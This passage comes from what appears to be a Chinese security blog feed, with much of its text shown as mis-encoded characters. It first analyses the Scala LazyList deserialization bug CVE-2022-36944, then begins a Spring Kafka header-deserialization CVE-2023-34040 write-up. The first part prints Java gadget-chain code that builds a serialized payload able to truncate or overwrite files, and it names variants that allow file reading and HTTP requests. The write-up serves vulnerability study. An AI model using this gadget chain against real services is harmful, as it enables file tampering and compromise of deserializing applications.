ä¹‹æ‰€ä»¥é€šè¿‡åå°„çš„æ–¹å¼è·å–å› ä¸ºProcessBuilderImplè¢«privateä¿®é¥°</span></span><br><span class="line">        <span class="keyword">return</span> ReflectionUtil.newInstance(<span class="string">&quot;scala.sys.process.ProcessBuilderImpl$FileOutput$$anonfun$$lessinit$greater$3&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123; ProcessBuilder$.class, File.class, <span class="type">boolean</span>.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">File</span>(fileToTruncate), append&#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p><code>generatePayload</code>æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LAZY_LIST_CLASSNAME</span> <span class="operator">=</span> <span class="string">&quot;scala.collection.immutable.LazyList&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] generatePayload(Object... args) &#123;</span><br><span class="line">   <span class="comment">// æ„é€ æ— å‚åŒ¿åå‡½æ•°</span></span><br><span class="line">   Function0&lt;Object&gt; function0 = function0Provider.apply(args);</span><br><span class="line">   <span class="comment">// åˆ›å»ºLazyList</span></span><br><span class="line">   <span class="type">Object</span> <span class="variable">lazyList</span> <span class="operator">=</span> createLazyList(function0);</span><br><span class="line">   <span class="comment">// æ¨¡æ‹ŸwriteReplaceæ–¹æ³•</span></span><br><span class="line">   <span class="type">Object</span> <span class="variable">serializationProxy</span> <span class="operator">=</span> ReflectionUtil.newInstance(<span class="string">&quot;scala.collection.immutable.LazyList$SerializationProxy&quot;</span>,</span><br><span class="line">            lazyList);</span><br><span class="line">   <span class="comment">// åºåˆ—åŒ–</span></span><br><span class="line">   <span class="keyword">return</span>  SerdeUtil.serialize(serializationProxy);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>function0Provider</code> å³å‰é¢ä¼ å…¥çš„<code>FILE_OUTPUT</code>ï¼Œé€šè¿‡è°ƒç”¨å…¶æ³¨å…¥å™¨æ–¹æ³•<code>apply</code>æ˜¾å¼çš„æ„é€ ä¸€ä¸ª<code>Function0</code>ç±»å‹çš„å¯¹è±¡ï¼Œç„¶åå°†è¯¥å¯¹è±¡ä¼ å…¥åˆ°<code>createLazyList</code>åˆ›å»ºä¸€ä¸ª<code>LazyList</code>å¯¹è±¡ï¼Œæœ€ç»ˆä½¿ç”¨<code>SerializationProxy</code>è¿›è¡ŒåŒ…è£…ï¼ˆå‚è€ƒ<code>LazyList writerePlace</code>æ–¹æ³•ï¼‰æœ€ç»ˆå°†è¯¥å¯¹è±¡åºåˆ—åŒ–ã€‚<br>åœ¨è°ƒç”¨<code>createLazyList</code> åˆ›å»º<code>LazyList</code>å¯¹è±¡æ—¶é¦–å…ˆé€šè¿‡åå°„çš„æ–¹å¼åˆ›å»ºäº†<code>LazyListå¯¹</code>è±¡ï¼Œç„¶åè®¾ç½®äº†å…¶ä¸‰ä¸ªå±æ€§ã€‚  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">createLazyList</span><span class="params">(Function0&lt;Object&gt; function0)</span> &#123;</span><br><span class="line">         <span class="comment">// åˆ›å»ºLazyListå¯¹è±¡</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">lazyList</span> <span class="operator">=</span> ReflectionUtil.newInstance(LAZY_LIST_CLASSNAME, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Function0.class&#125;, function0);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">emptyLazyListState</span> <span class="operator">=</span> ReflectionUtil.getStaticField(<span class="string">&quot;scala.collection.immutable.LazyList$State$Empty$&quot;</span>, <span class="string">&quot;MODULE$&quot;</span>);</span><br><span class="line">        <span class="comment">// è®¾ç½®Emptyå¯¹è±¡ç±»å‹çš„stateï¼Œä»¥ä¾¿ååºåˆ—åŒ–èƒ½å¤Ÿç»“æŸ</span></span><br><span class="line">        ReflectionUtil.setField(lazyList, <span class="string">&quot;scala$collection$immutable$LazyList$$state&quot;</span>, emptyLazyListState);</span><br><span class="line">        <span class="comment">// è®¾ç½®stateEvaluated åœ¨è¿›è¡ŒKonwnonEmptyæ£€æŸ¥æ—¶ç¡®ä¿è¿›å…¥åˆ°isEmptyæ–¹æ³•ä¸­</span></span><br><span class="line">        ReflectionUtil.setField(lazyList, <span class="string">&quot;scala$collection$immutable$LazyList$$stateEvaluated&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="comment">// é¿å…åºåˆ—åŒ–è¿‡ç¨‹ä¸­åœ¨æœ¬åœ°è§¦å‘Payload</span></span><br><span class="line">        ReflectionUtil.setField(lazyList, <span class="string">&quot;bitmap$0&quot;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> lazyList;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨<code>POC</code>ä¸­é™¤äº†æä¾›<code>scala.sys.process.ProcessBuilderImpl$FileOutput$$anonfun$$lessinit$greater$3</code>å¤–ï¼Œè¿˜æä¾›äº†å¦å¤–ä¸¤ä¸ªå¯ä½¿ç”¨çš„åŒ¿åå‡½æ•°  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å¯è¿›è¡Œæ–‡ä»¶è¯»å–</span></span><br><span class="line">scala.sys.process.ProcessBuilderImpl$FileInput$$anonfun$$lessinit$greater$<span class="number">2</span></span><br><span class="line"><span class="comment">// å¯å‘èµ·httpè¯·æ±‚</span></span><br><span class="line">scala.sys.process.ProcessBuilderImpl$URLInput$$anonfun$$lessinit$greater$<span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>é‚£ä¹ˆåœ¨<code>Scala</code>æºç ä¸­ç€ä¸‰ä¸ªåŒ¿åå‡½æ•°æ¥è‡ªå“ªé‡Œã€‚<br>åœ¨åˆ›å»º<code>Scala</code>åŒ¿åå‡½æ•°æ—¶ï¼Œè‹¥æ²¡æœ‰æ˜¾å¼åœ°ä¸ºè¿™äº›å‡½æ•°å‘½åï¼Œé‚£ä¹ˆ<code>Scala</code>ç¼–è¯‘å™¨å°†è‡ªåŠ¨ä¸ºè¿™äº›å‡½æ•°åˆ†é…ä¸€ä¸ªåç§°ï¼Œè¿™äº›åç§°çš„æ ¼å¼ä¸º<code>$anonfunc$1</code>ï¼Œå…¶ä¸­<code>$anonfunc</code>è¡¨ç¤ºç€æ˜¯åŒ¿åå‡½æ•°ï¼Œ<code>$1</code>ä¸ºç¼–å·ç”¨ä»¥åŒºåˆ†ä¸åŒçš„åŒ¿åå‡½æ•°ã€‚<br>äº†è§£äº†è¿™ä¸€ç‚¹æˆ‘ä»¬å°è¯•å¯¹<code>scala.sys.process.ProcessBuilderImpl$FileOutput$$anonfun$$lessinit$greater$3</code>è¿›è¡Œè§£æã€‚<br><code>ProcessBuilderImpl</code>ä¸ºç‰¹è´¨ï¼Œè€Œ<code>FileOutput</code>æ˜¯å…¶å†…éƒ¨ç±»ï¼Œ<code>anonfun</code>æ ‡è¯†äº†åŒ¿åå‡½æ•°ï¼Œ<code>$lessinit$greater</code>æ ‡è¯†äº†åç§°ï¼Œ<code>$3</code>æ ‡è¯†äº†åŒ¿åå‡½æ•°çš„ç¼–å·ã€‚å°†<code>$lessinit$greater</code>ç¿»è¯‘ä¸€ä¸‹å°±æ˜¯<code>&lt;init&gt;</code>ã€‚è¿™ä¸å‰æ–‡æåˆ°çš„åŒ¿åå‡½æ•°é€šç”¨æ ¼å¼æœ‰æ‰€åŒºåˆ«ï¼Œ<code>Payload</code>ä½¿ç”¨çš„åŒ¿åå‡½æ•°å¤šäº†<code>$lessinit$greater</code>æ ‡å¿—ã€‚<br>åœ¨<code>Scala</code> æºç ä¸­ æˆ‘ä»¬æ‰¾åˆ°äº†<code>ProcessBuilderImpl</code>å†…éƒ¨ç±»<code>FileOutput</code>ä»¥åŠå¦å¤–ä¸¤ä¸ªå¯ç”¨å†…éƒ¨ç±»çš„å®ç°ã€‚  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span>[process] <span class="class"><span class="keyword">class</span> <span class="title">URLInput</span>(<span class="params">url: <span class="type">URL</span></span>) <span class="keyword">extends</span> <span class="title">IStreamBuilder</span>(<span class="params">url.openStream(</span>), <span class="title">url</span>.<span class="title">toString</span>)</span></span><br><span class="line"><span class="keyword">private</span>[process] <span class="class"><span class="keyword">class</span> <span class="title">FileInput</span>(<span class="params">file: <span class="type">File</span></span>) <span class="keyword">extends</span> <span class="title">IStreamBuilder</span>(<span class="params">new <span class="type">FileInputStream</span>(file</span>), <span class="title">file</span>.<span class="title">getAbsolutePath</span>)</span></span><br><span class="line"><span class="keyword">private</span>[process] <span class="class"><span class="keyword">class</span> <span class="title">FileOutput</span>(<span class="params">file: <span class="type">File</span>, append: <span class="type">Boolean</span></span>) <span class="keyword">extends</span> <span class="title">OStreamBuilder</span>(<span class="params">new <span class="type">FileOutputStream</span>(file, append</span>), <span class="title">file</span>.<span class="title">getAbsolutePath</span>)</span></span><br></pre></td></tr></table></figure>
<p>åœ¨è¿™é‡Œï¼Œæ³¨æ„åˆ°è¿™ä¸‰ä¸ªç±»é™¤äº†å®šä¹‰äº†ä¸»æ„é€ å‡½æ•°å¤–ä¾¿åœ¨æ²¡æœ‰å®šä¹‰å…¶ä»–çš„å†…å®¹äº†ï¼Œé‚£ä¹ˆ<code>Payload</code>ä¸­çš„åŒ¿åå‡½æ•°ä»å“ªé‡Œæ¥ã€‚<br>é€šè¿‡è§‚å¯Ÿä¸Šè¿°ä¸‰ä¸ªå‡½æ•°çš„å£°æ˜å½¢å¼ï¼Œå¯ä»¥æ³¨æ„åˆ°ä»¥ä¸‹ç‰¹å¾  </p>
<ul>
<li>å‡ç»§æ‰¿äº†ä¸€ä¸ªçˆ¶ç±»  </li>
<li>åœ¨çˆ¶ç±»çš„ä¸»æ„é€ å‡½æ•°ä¸­è°ƒç”¨äº†å­ç±»å‚æ•°çš„æ–¹æ³•</li>
</ul>
<p>è·Ÿè¿›IStreamBuilderç±»ï¼Œè¿˜å¯ä»¥å‘ç°è¯¥ç±»çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºä¼ åè°ƒç”¨  </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span>[process] <span class="class"><span class="keyword">class</span> <span class="title">IStreamBuilder</span>(<span class="params"></span></span></span><br><span class="line"><span class="params"><span class="class">  stream: =&gt; <span class="type">InputStream</span>, <span class="comment">// =&gt; æ ‡è¯†äº†ä¼ åè°ƒç”¨</span></span></span></span><br><span class="line"><span class="params"><span class="class">  label: <span class="type">String</span></span></span></span><br><span class="line"><span class="params"><span class="class"></span>) <span class="keyword">extends</span> <span class="title">ThreadBuilder</span>(<span class="params">label, _ processOutput protect(stream</span>)) </span>&#123;</span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">hasExitValue</span> </span>= <span class="literal">false</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡æ¨¡æ‹Ÿä¸Šè¿°å½¢å¼å¾—åˆ°ä»¥ä¸‹ä»£ç   </p>
<figure class="highlight scala"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parent</span>(<span class="params">i: =&gt; <span class="type">Int</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Son</span>(<span class="params">s: <span class="type">String</span></span>) <span class="keyword">extends</span> <span class="title">Parent</span>(<span class="params">s.length(</span>))</span></span><br></pre></td></tr></table></figure>
<p>é€šè¿‡<code>IDEA</code>è¿›è¡Œç¼–è¯‘åæŸ¥çœ‹ç”Ÿæˆçš„ç±»å‘ç°ç¡®å®ç”Ÿæˆäº†<code>Son$$anonfun$$lessinit$greater$1</code><br><img src="/archives/2a377379/image-7.png" alt="alt text"><br>é€šè¿‡<code>javap</code>å‘½ä»¤æŸ¥çœ‹è¯¥ç±»çš„å­—èŠ‚ç   </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å‰æ–‡æåˆ°çš„ï¼ŒåŒ¿åå‡½æ•°å…¥å£åœ¨applyæ–¹æ³•</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">apply</span><span class="params">()</span>;</span><br><span class="line">    descriptor: ()I</span><br><span class="line">    flags: ACC_PUBLIC, ACC_FINAL</span><br><span class="line">    Code:</span><br><span class="line">      stack=<span class="number">1</span>, locals=<span class="number">1</span>, args_size=<span class="number">1</span></span><br><span class="line">         <span class="number">0</span>: aload_0</span><br><span class="line">         <span class="comment">// è°ƒç”¨å¸¸é‡å€¼ä¸­ 23å·ç´¢å¼•æŒ‡å‘çš„MethodRef å³apply$mcI$sp:()I</span></span><br><span class="line">         <span class="number">1</span>: invokevirtual #<span class="number">23</span>                 <span class="comment">// Method apply$mcI$sp:()I</span></span><br><span class="line">         <span class="number">4</span>: ireturn</span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line <span class="number">7</span>: <span class="number">0</span></span><br><span class="line">      LocalVariableTable:</span><br><span class="line">        Start  Length  Slot  Name   Signature</span><br><span class="line">            <span class="number">0</span>       <span class="number">5</span>     <span class="number">0</span>  <span class="built_in">this</span>   Lorg/example/Son$$anonfun$$lessinit$greater$<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> apply$mcI$sp();</span><br><span class="line">    descriptor: ()I</span><br><span class="line">    flags: ACC_PUBLIC</span><br><span class="line">    Code:</span><br><span class="line">      stack=<span class="number">1</span>, locals=<span class="number">1</span>, args_size=<span class="number">1</span></span><br><span class="line">         <span class="comment">// å°†å½“å‰æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ”¾åˆ°æ“ä½œæ•°æ ˆé¡¶ï¼Œå³this</span></span><br><span class="line">         <span class="number">0</span>: aload_0</span><br><span class="line">         <span class="comment">// ç”¨ä»¥è·å–å¸¸é‡æ± ä¸­ 27å·ç´¢å¼•æ‰€æŒ‡å‘çš„FieldRefçš„å€¼ï¼Œå¹¶æ”¾å…¥æ“ä½œæ•°æ ˆé¡¶</span></span><br><span class="line">         <span class="number">1</span>: getfield      #<span class="number">27</span>                 <span class="comment">// Field s$1:Ljava/lang/String;</span></span><br><span class="line">         <span class="comment">// è°ƒç”¨å¸¸é‡æ± ä¸­ 32å·ç´¢å¼•æŒ‡å‘çš„Methodref å³ java/lang/String.length:()I</span></span><br><span class="line">         <span class="number">4</span>: invokevirtual #<span class="number">32</span>                 <span class="comment">// Method java/lang/String.length:()I</span></span><br><span class="line">         <span class="comment">// è¿”å›æ‰§è¡Œçš„ç»“æœ</span></span><br><span class="line">         <span class="number">7</span>: ireturn</span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line <span class="number">7</span>: <span class="number">0</span></span><br><span class="line">      LocalVariableTable:</span><br><span class="line">        Start  Length  Slot  Name   Signature</span><br><span class="line">            <span class="number">0</span>       <span class="number">8</span>     <span class="number">0</span>  <span class="built_in">this</span>   Lorg/example/Son$$anonfun$$lessinit$greater$<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡åˆ†æå‘ç°ï¼Œ<code>Son$$anonfun$$lessinit$greater$1</code>å³æ˜¯<code>Parent</code>ç±»çš„ç¬¬ä¸€ä¸ªå‚æ•°<code>s.length()</code>çš„å¼•ç”¨ï¼ŒåŒç†å¯çŸ¥åœ¨<code>FileOutput</code> ä¸­ <code>scala.sys.process.ProcessBuilderImpl$FileOutput$$anonfun$$lessinit$greater$3</code> å³<code>new FileOutputStream(file, append)</code>çš„å¼•ç”¨ã€‚æ•…POCä¸­åœ¨åˆ›å»º<code>scala.sys.process.ProcessBuilderImpl$FileOutput$$anonfun$$lessinit$greater$3</code>å¯¹è±¡æ—¶ä¼ å…¥äº†ä¸¤ä¸ªå‚æ•°<code>new File(fileToTruncate), append</code></p>
<h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul>
<li><a href="https://docs.scala-lang.org/#/">Scala Document</a></li>
<li><a href="https://www.freebuf.com/vuls/347146.html#/">Apache Spark UI å‘½ä»¤æ³¨å…¥æ¼æ´ CVE-2022-33891
</a></li>
<li><a href="https://github.com/apache/spark/blob/v3.3.1/core/src/main/scala/org/apache/spark/ui/HttpSecurityFilter.scala">Apache Spark UI HttpSecurityFilter æºä»£ç </a></li>
<li><a href="https://www.freebuf.com/articles/network/375109.html#/">åŸºäºLazyListçš„Scalaååºåˆ—åŒ–æ¼æ´é€æ(CVE-2022-36944)
</a></li>
<li><a href="https://github.com/yarocher/lazylist-cve-poc/tree/main#/">CVE-2022-36944 POC</a></li>
</ul>
]]></content>
      <categories>
        <category>æ¼æ´åŸç†</category>
        <category>ä»£ç å®¡è®¡</category>
      </categories>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
        <tag>æ¼æ´åŸç†</tag>
        <tag>Scala</tag>
      </tags>
  </entry>
  <entry>
    <title>Spring Kafka æ¶ˆæ¯å¤´ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2023-34040ï¼‰</title>
    <url>/archives/6725ab5c.html</url>
    <content><![CDATA[<h1 id="Spring-Kafkaæ¶ˆæ¯å¤´ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2023-34040ï¼‰"><a href="#Spring-Kafkaæ¶ˆæ¯å¤´ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2023-34040ï¼‰" class="headerlink" title="Spring Kafkaæ¶ˆæ¯å¤´ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2023-34040ï¼‰"></a>Spring Kafkaæ¶ˆæ¯å¤´ååºåˆ—åŒ–æ¼æ´ï¼ˆCVE-2023-34040ï¼‰</h1><h2 id="äº§å“ä»‹ç»"><a href="#äº§å“ä»‹ç»" class="headerlink" title="äº§å“ä»‹ç»"></a>äº§å“ä»‹ç»</h2><p>Spring for Apache Kafka (Spring - Kafka)é¡¹ç›®å°†Springçš„æ ¸å¿ƒæ¦‚å¿µåº”ç”¨äºåŸºäºKafkaçš„æ¶ˆæ¯ä¼ é€’è§£å†³æ–¹æ¡ˆçš„å¼€å‘ã€‚å®ƒæä¾›äº†ä¸€ä¸ªâ€œtemplateâ€ä½œä¸ºå‘é€æ¶ˆæ¯çš„é«˜çº§æŠ½è±¡ã€‚å®ƒè¿˜æ”¯æŒå¸¦æœ‰@KafkaListeneræ³¨è§£å’Œâ€œlistener containerâ€çš„æ¶ˆæ¯é©±åŠ¨POJOs ã€‚è¿™äº›åº“æå€¡ä½¿ç”¨ä¾èµ–æ³¨å…¥å’Œå£°æ˜å¼çš„ä½¿ç”¨æ–¹å¼ã€‚æ‰€æœ‰è¿™äº›ä¾‹å­éƒ½ä¸Springæ¡†æ¶çš„JMSæ”¯æŒå’ŒSpring AMQPå¯¹RabbitMQçš„æ”¯æŒæœ‰ç›¸ä¼¼ä¹‹å¤„ã€‚</p>
<h2 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>å½“Kafkaåº”ç”¨æœåŠ¡å™¨å…è®¸ä¸€ä¸ªä¸å—ä¿¡ä»»çš„æºçš„ç”Ÿäº§æ¶ˆæ¯çš„æ—¶å€™ï¼Œè‹¥å…¶èƒ½å¤Ÿæ§åˆ¶æ¶ˆæ¯çš„headersï¼Œåˆ™å¯èƒ½å¯¼è‡´ä¸€ä¸ªååºåˆ—åŒ–æ¼æ´çš„å‘ç”Ÿã€‚</p>
<span id="more"></span>

<h2 id="å—å½±å“ç‰ˆæœ¬"><a href="#å—å½±å“ç‰ˆæœ¬" class="headerlink" title="å—å½±å“ç‰ˆæœ¬"></a>å—å½±å“ç‰ˆæœ¬</h2><ul>
<li>2.8.1 to 2.9.10</li>
<li>3.0.0 to 3.0.9</li>
</ul>
<h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><h3 id="è°ƒè¯•ç¯å¢ƒ"><a href="#è°ƒè¯•ç¯å¢ƒ" class="headerlink" title="è°ƒè¯•ç¯å¢ƒ"></a>è°ƒè¯•ç¯å¢ƒ</h3><p>ä½¿ç”¨ideaæ–°å»ºåŸºäºmavençš„javaé¡¹ç›®ï¼Œåœ¨pom.xmlä¸­å¼•å…¥ç›¸å…³ä¾èµ–åŒ…</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.6.14<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span>/&gt;</span> <span class="comment">&lt;!-- lookup parent from repository --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.arliya<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>SpringKafkaTest<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>SpringKafkaTest<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>SpringKafkaTest<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.kafka<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-kafka<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--            &lt;version&gt;2.9.11&lt;/version&gt;--&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.projectlombok/lombok --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.projectlombok<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>lombok<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.18.28<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œä½¿ç”¨spring-boot-starter-parentç‰ˆæœ¬ä¸º2.6.14ï¼Œå…¶ä¾èµ–çš„Spring Kafkaç‰ˆæœ¬ä¸º2.8.11ï¼Œä¸ºå­˜åœ¨æ¼æ´ç‰ˆæœ¬ï¼›</p>
<p>ä¸ºäº†å¯¹æ¯”ï¼Œä¿®æ”¹Spring Kafkaçš„ç‰ˆæœ¬ä¸º2.9.11ï¼Œä¸ºä¸å—ä¿®å¤ç‰ˆæœ¬ã€‚</p>
<p>ä¸ºäº†èƒ½å¤Ÿè¿›è¡Œæ¼æ´å¤ç°ï¼Œæˆ‘ä»¬éœ€è¦ç¼–å†™ä¸€éƒ¨åˆ†ä»£ç </p>
<p><img src="/archives/6725ab5c/image-20230825134125955.png" alt="image-20230825134125955"></p>
<p>æµ‹è¯•ä»£ç ä¸»è¦åŒ…æ‹¬Kafkaçš„ç”Ÿäº§è€…äºæ¶ˆè´¹è€…çš„é…ç½®ï¼Œä¸€ä¸ªç”Ÿäº§æ¶ˆæ¯çš„Webæ¥å£æ§åˆ¶å™¨ï¼Œä¸€ä¸ªæ¶ˆè´¹æ¶ˆæ¯çš„Serviceï¼Œå…³äºSpring Kafkaçš„ä½¿ç”¨æ–¹å¼ï¼Œå¯ä»¥å‚è€ƒè¯¥æ–‡ç« ï¼š</p>
<p><a href="https://juejin.cn/post/7207411012479074364">https://juejin.cn/post/7207411012479074364</a></p>
<p>ä¸¤å¤–ï¼Œè¿˜éœ€è¦æ­å»ºApache KafkaæœåŠ¡å™¨ï¼Œå»ºè®®ä½¿ç”¨Dockerä¸€é”®æ­å»ºï¼Œå…·ä½“æ–¹å¼å¯ä»¥å‚è€ƒä»¥ä¸‹æ–‡ç« ï¼š</p>
<p><a href="https://juejin.cn/post/6960820341631352868">https://juejin.cn/post/6960820341631352868</a></p>
<h3 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h3><p>åœ¨è¿›è¡Œæ¼æ´å¤ç°å‰ï¼Œéœ€è¦æœ‰ä¸€äº›äº<code>Apache Kafka</code>ç›¸å…³çš„åŸºç¡€çŸ¥è¯†ã€‚</p>
<p><code>Kafka</code> æ˜¯ä¸€ç§åˆ†å¸ƒå¼çš„ï¼ŒåŸºäºå‘å¸ƒ &#x2F; è®¢é˜…çš„æ¶ˆæ¯ç³»ç»Ÿã€‚KafkaåŒ…å«ä¸€äº›åŸºæœ¬æ¦‚å¿µï¼Œå¦‚ç”Ÿäº§è€…ã€æ¶ˆè´¹è€…</p>
<ul>
<li>ç”Ÿäº§è€…ï¼šè´Ÿè´£æ¶ˆæ¯çš„äº§ç”Ÿï¼Œå¹¶æ¨é€åˆ°KafkaæœåŠ¡å™¨</li>
<li>æ¶ˆè´¹è€…ï¼šè´Ÿè´£æ¶ˆæ¯çš„æ¶ˆè´¹</li>
</ul>
